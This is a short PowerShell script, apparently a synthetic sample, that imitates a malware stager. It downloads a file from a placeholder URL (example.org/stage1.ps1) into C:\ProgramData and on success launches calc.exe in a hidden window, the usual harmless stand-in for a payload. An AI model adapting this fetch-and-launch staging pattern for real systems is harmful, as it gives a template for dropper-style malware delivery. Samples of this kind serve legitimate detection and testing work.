[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$DownloadUrl = "http://example.org/stage1.ps1",
    [string]$WorkingPath = 'C:\ProgramData\stage2.bin',
    [int]$StageTimeout = 126
)
$ErrorActionPreference = "Stop"

function Invoke-Stage1Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Beginning first stage"
    $FetchResult = Invoke-Stage1Download -SourceUrl $DownloadUrl -DestinationPath $WorkingPath -TimeoutSec $StageTimeout
    if ($FetchResult) {
        Start-Process -FilePath "calc.exe" -WindowStyle Hidden
    }
}
catch {
    Write-Warning "Stage 1 retrieval failed: $($_.Exception.Message)"
}
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
Write-Output "stage 10 initialized"
